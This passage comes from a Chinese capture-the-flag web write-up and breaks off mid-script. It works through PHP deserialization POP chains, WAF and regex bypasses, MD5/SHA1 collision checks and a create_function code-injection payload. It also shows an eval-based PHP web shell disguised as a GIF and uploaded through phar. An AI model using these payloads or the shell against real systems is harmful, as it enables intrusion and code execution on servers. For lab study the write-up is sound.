    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
}

<span class="hljs-comment">//func checkcheck($data){</span>
<span class="hljs-comment">//  if(preg_match(......)){</span>
<span class="hljs-comment">//      die(something wrong);</span>
<span class="hljs-comment">//  }</span>
<span class="hljs-comment">//}</span>

<span class="hljs-comment">//function hint(){</span>
<span class="hljs-comment">//    echo ".......";</span>
<span class="hljs-comment">//    die();</span>
<span class="hljs-comment">//}</span>
<span class="hljs-meta">?&gt;</span></code></pre>
<p>链子很容易走通</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NISA</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fun</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$txw4ever</span>;
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TianXiWei</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ext</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$x</span>;
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ilovetxw</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$huang</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$su</span>;
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">four</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">"TXW4EVER"</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-variable">$fun</span>=<span class="hljs-string">'abc'</span>;
}

<span class="hljs-variable">$pop</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">NISA</span>();
<span class="hljs-variable">$pop</span>-&gt;fun = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ilovetxw</span>();
<span class="hljs-variable">$pop</span>-&gt;fun-&gt;su = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">NISA</span>();
<span class="hljs-variable">$pop</span>-&gt;fun-&gt;su-&gt;fun = <span class="hljs-string">'hybcx'</span>;
<span class="hljs-variable">$pop</span>-&gt;fun-&gt;su-&gt;txw4ever = <span class="hljs-string">'aaa'</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pop</span>);

<span class="hljs-meta">?&gt;</span></code></pre>
<p>不过就是最后的绕waf了，这里system被过滤了，如果你仔细看的话，会发现</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157078.png" alt="image-20240719174009642"></p>
<p>上图这里没有检测大小写，那我们尝试大写看看。如下图，成功绕过</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157079.png" alt="image-20240719174115585"></p>
<h2 id="popchains">popchains</h2>
<pre><code class="hljs php">Happy New Year~ MAKE A WISH
<span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">echo</span> <span class="hljs-string">'Happy New Year~ MAKE A WISH&lt;br&gt;'</span>;

<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'wish'</span>])){
    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'wish'</span>]);
}
<span class="hljs-keyword">else</span>{
    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Road_is_Long</span>;
    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
}
<span class="hljs-comment">/***************************pop your 2022*****************************/</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Road_is_Long</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$page</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$string</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">'index.php'</span></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;page = <span class="hljs-variable">$file</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">string</span>-&gt;page;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/file|ftp|http|https|gopher|dict|\.\./i"</span>, <span class="hljs-variable">$this</span>-&gt;page)) {
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"You can Not Enter 2022"</span>;
            <span class="hljs-variable language_">$this</span>-&gt;page = <span class="hljs-string">"index.php"</span>;
        }
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Try_Work_Hard</span></span>{
    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>{
        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Make_a_Change</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$effort</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;effort = <span class="hljs-keyword">array</span>();
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>{
        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;effort;
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();
    }
}
<span class="hljs-comment">/**********************Try to See flag.php*****************************/</span></code></pre>
<p>链子如下</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Road_is_Long</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$page</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$string</span>;
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Try_Work_Hard</span></span>{
    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span> = <span class="hljs-string">'/flag'</span>;
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Make_a_Change</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$effort</span>;
}

<span class="hljs-variable">$pop</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Road_is_Long</span>();
<span class="hljs-variable">$pop</span>-&gt;page = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Road_is_Long</span>();
<span class="hljs-variable">$pop</span>-&gt;page-&gt;<span class="hljs-keyword">string</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Make_a_Change</span>();
<span class="hljs-variable">$pop</span>-&gt;page-&gt;<span class="hljs-keyword">string</span>-&gt;effort = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Try_Work_Hard</span>();
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pop</span>));

<span class="hljs-meta">?&gt;</span></code></pre>
<p>一开始根据提示读取flag.php。啥反应没有，看了wp发现都是在读/flag，估计是环境部署问题</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157080.png" alt="image-20240719175414626"></p>
<h2 id="midlevel">midlevel</h2>
<p>根据payload直接读取flag</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157081.png" alt="image-20240719175747238"></p>
<h2 id="level-up">level-up</h2>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157082.png" alt="image-20240719175909626"></p>
<p>看源代码提示，知道是访问robots.txt</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//here is level 2</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">include</span> <span class="hljs-string">"str.php"</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'array1'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'array2'</span>])){
    <span class="hljs-variable">$a1</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'array1'</span>];
    <span class="hljs-variable">$a2</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'array2'</span>];
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a1</span> == <span class="hljs-variable">$a2</span>){
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"????"</span>);
    }
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a1</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a2</span>)){
        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$level3</span>;
    }
    <span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"level 2 failed ..."</span>);
    }

}
<span class="hljs-keyword">else</span>{
    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>接着md5强碰撞绕过</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157083.png" alt="image-20240719180206179"></p>
<p>得到第三关</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//here is level 3</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">include</span> <span class="hljs-string">"str.php"</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'array1'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'array2'</span>])){
    <span class="hljs-variable">$a1</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'array1'</span>];
    <span class="hljs-variable">$a2</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'array2'</span>];
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a1</span> == <span class="hljs-variable">$a2</span>){
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"????"</span>);
    }
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$a1</span>) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$a2</span>)){
        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$level4</span>;
    }
    <span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"level 3 failed ..."</span>);
    }

}
<span class="hljs-keyword">else</span>{
    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>接着sha1强碰撞绕过</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157084.png" alt="image-20240719180343034"></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//here is last level</span>
    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
    <span class="hljs-keyword">include</span> <span class="hljs-string">"str.php"</span>;
    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);

    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'REQUEST_URI'</span>]);
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$str</span>[<span class="hljs-string">'query'</span>] == <span class="hljs-string">""</span>){
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"give me a parameter"</span>;
    }
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/ |_|20|5f|2e|\./'</span>,<span class="hljs-variable">$str</span>[<span class="hljs-string">'query'</span>])){
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"blacklist here"</span>);
    }
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'NI_SA_'</span>] === <span class="hljs-string">"txw4ever"</span>){
        <span class="hljs-keyword">die</span>(<span class="hljs-variable">$level5</span>);
    }
    <span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"level 4 failed ..."</span>);
    }

<span class="hljs-meta">?&gt;</span>
give me a parameterlevel <span class="hljs-number">4</span> failed ...</code></pre>
<p>这一关是PHP变量解析绕过，稍微总结一下：</p>
<p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p>
<pre><code class="hljs scss"><span class="hljs-number">1</span>.删除空白符
<span class="hljs-number">2</span>.将某些字符转换为下划线（包括空格）</code></pre>
<table>
<thead>
<tr>
<th>User input</th>
<th>Decoded PHP</th>
<th>variable name</th>
</tr>
</thead>
<tbody>
<tr>
<td>%20foo_bar%00</td>
<td>foo_bar</td>
<td>foo_bar</td>
</tr>
<tr>
<td>foo%20bar%00</td>
<td>foo bar</td>
<td>foo_bar</td>
</tr>
<tr>
<td>foo%5bbar</td>
<td>foo[bar</td>
<td>foo_bar</td>
</tr>
</tbody>
</table>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157085.png" alt="image-20240719181359111"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157086.png" alt="image-20240719181419492"></p>
<p>很明显+可以绕过</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//sorry , here is true last level</span>
<span class="hljs-comment">//^_^</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">include</span> <span class="hljs-string">"str.php"</span>;

<span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'a'</span>];
<span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'b'</span>];
<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/^[a-z0-9_]*$/isD'</span>,<span class="hljs-variable">$a</span>)){
    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);
}
<span class="hljs-keyword">else</span>{
    <span class="hljs-variable">$a</span>(<span class="hljs-string">''</span>,<span class="hljs-variable">$b</span>);
}</code></pre>
<p>这个绕过方法，忘记了。总的来说，先说正则表达式的含义：他匹配的是整个字符串，因此只要不满足以下条件的任意一个即可绕过</p>
<ul>
<li>字符串只能包含大小写字母（<code>a-z</code> 和 <code>A-Z</code>）、数字（<code>0-9</code>）和下划线（<code>_</code>）。</li>
<li>字符串可以为空。</li>
<li>字符串的开始和结束位置都必须满足这个字符类的限制。</li>
</ul>
<p>因此payload可以是：</p>
<pre><code class="hljs scss">?<span class="hljs-selector-tag">a</span>=\create_function&amp;<span class="hljs-selector-tag">b</span>=}<span class="hljs-built_in">system</span>('cat /f*');<span class="hljs-comment">//</span></code></pre>
<p>构造思路是：</p>
<p>create_function()函数会在内部执行 eval()，我们发现是执行了后面的return语句，属于create_function()中的第二个参数string 𝑐𝑜𝑑𝑒位置。<code>𝑐𝑟𝑒𝑎𝑡𝑒_𝑓𝑢𝑛𝑐𝑡𝑖𝑜𝑛(′a,𝑏′,′𝑟𝑒𝑡𝑢𝑟𝑛"𝑙𝑛(b′,′ln(a) + ln(𝑏)=".𝑙𝑜𝑔(b)=".log(a * $b);');</code></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">lambda_1</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span></span>)</span>{
    <span class="hljs-keyword">return</span> <span class="hljs-string">"ln(<span class="hljs-subst">$a</span>) + ln(<span class="hljs-subst">$b</span>) = "</span> . <span class="hljs-title function_ invoke__">log</span>(<span class="hljs-variable">$a</span> * <span class="hljs-variable">$b</span>);
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>因此}闭合lambda表达式的{，然后注释符注释掉其他。</p>
<h2 id="bingdundun~">bingdundun~</h2>
<p>文件上传+文件包含</p>
<p>题目提示我们只能上传压缩包或者图片，这里也是看了wp知道是phar协议，其实结合题目的可以上传压缩包类型文件也可以猜到。</p>
<p>由于存在文件包含，那我们直接构造一个压缩包，文件内容如下</p>
<pre><code class="hljs php">GIF89a
<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></code></pre>
<p>随后，压缩成压缩包，上传，得到的路径，用phar伪协议读取。</p>
<p>如下图所示，至于为何这里后面只添加了shell，是因为题目代码会自动加上php</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157087.png" alt="image-20240719184321766"></p>
<h2 id="middlerce">middlerce</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">"check.php"</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'letter'</span>])){
    <span class="hljs-variable">$txw4ever</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'letter'</span>];
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&amp;|!|\&lt;|\&gt;|\{|\x09|\x0a|\[).*$/m'</span>,<span class="hljs-variable">$txw4ever</span>)){
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"再加把油喔"</span>);
    }
    <span class="hljs-keyword">else</span>{
        <span class="hljs-variable">$command</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$txw4ever</span>,<span class="hljs-literal">true</span>)[<span class="hljs-string">'cmd'</span>];
        <span class="hljs-title function_ invoke__">checkdata</span>(<span class="hljs-variable">$command</span>);
        @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$command</span>);
    }
}
<span class="hljs-keyword">else</span>{
    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>一个是绕过正则，另一个是要符合json数据的格式。</p>
<p>正则的话，见多了就知道这里是回溯次数限制绕过</p>
<pre><code class="hljs scss">PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre<span class="hljs-selector-class">.backtrack_limit</span>默认<span class="hljs-number">1000000</span>，超过<span class="hljs-number">1000000</span>不会返回<span class="hljs-number">1</span>或<span class="hljs-number">0</span>而是false即超过限制即可。</code></pre>
<p>脚本如下</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> requests

payload = <span class="hljs-string">'{"cmd":"cmd", "a":"'</span>+<span class="hljs-string">'#'</span>*<span class="hljs-number">1000000</span>+<span class="hljs-string">'"}'</span>
res = requests.post(<span class="hljs-string">"http://node4.anna.nssctf.cn:28035/"</span>,data = {<span class="hljs-string">"letter"</span>:payload})
<span class="hljs-built_in">print</span>(res.text)</code></pre>
<h2 id="is-secret">is secret</h2>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157088.png" alt="image-20240719194835047"></p>
<p>首页让你找secret，扫目录看一下</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157089.png" alt="image-20240719194859050"></p>
<p>访问secret，发现可以给secret传参，然后胡乱传参，报错，看到下面的部分源码</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157090.png" alt="image-20240719194826442"></p>
<p>经过RC4的解密然后加密，在经过safe的过滤，随后进行模板渲染</p>
<p>加密脚本如下</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> base64
<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote
<span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_main</span>(<span class="hljs-params">key = <span class="hljs-string">"init_key"</span>, message = <span class="hljs-string">"init_message"</span></span>):
    <span class="hljs-comment"># print("RC4加密主函数")</span>
    s_box = rc4_init_sbox(key)
    crypt = <span class="hljs-built_in">str</span>(rc4_excrypt(message, s_box))
    <span class="hljs-keyword">return</span>  crypt
<span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_init_sbox</span>(<span class="hljs-params">key</span>):
    s_box = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))  <span class="hljs-comment"># 我这里没管秘钥小于256的情况，小于256不断重复填充即可</span>
    <span class="hljs-comment"># print("原来的 s 盒：%s" % s_box)</span>
    j = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):
        j = (j + s_box[i] + <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)])) % <span class="hljs-number">256</span>
        s_box[i], s_box[j] = s_box[j], s_box[i]
    <span class="hljs-comment"># print("混乱后的 s 盒：%s"% s_box)</span>
    <span class="hljs-keyword">return</span> s_box
<span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_excrypt</span>(<span class="hljs-params">plain, box</span>):
    <span class="hljs-comment"># print("调用加密程序成功。")</span>
    res = []
    i = j = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> plain:
        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>
        j = (j + box[i]) % <span class="hljs-number">256</span>
        box[i], box[j] = box[j], box[i]
        t = (box[i] + box[j]) % <span class="hljs-number">256</span>
        k = box[t]
        res.append(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(s) ^ k))
    <span class="hljs-comment"># print("res用于加密字符串，加密后是：%res" %res)</span>
    cipher = <span class="hljs-string">""</span>.join(res)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"加密后的字符串是：%s"</span> %quote(cipher))
    <span class="hljs-comment">#print("加密后的输出(经过编码):")</span>
    <span class="hljs-comment">#print(str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))</span>
    <span class="hljs-keyword">return</span> (<span class="hljs-built_in">str</span>(base64.b64encode(cipher.encode(<span class="hljs-string">'utf-8'</span>)), <span class="hljs-string">'utf-8'</span>))
<span class="hljs-comment">#需要加密的字符串在这里修改</span>
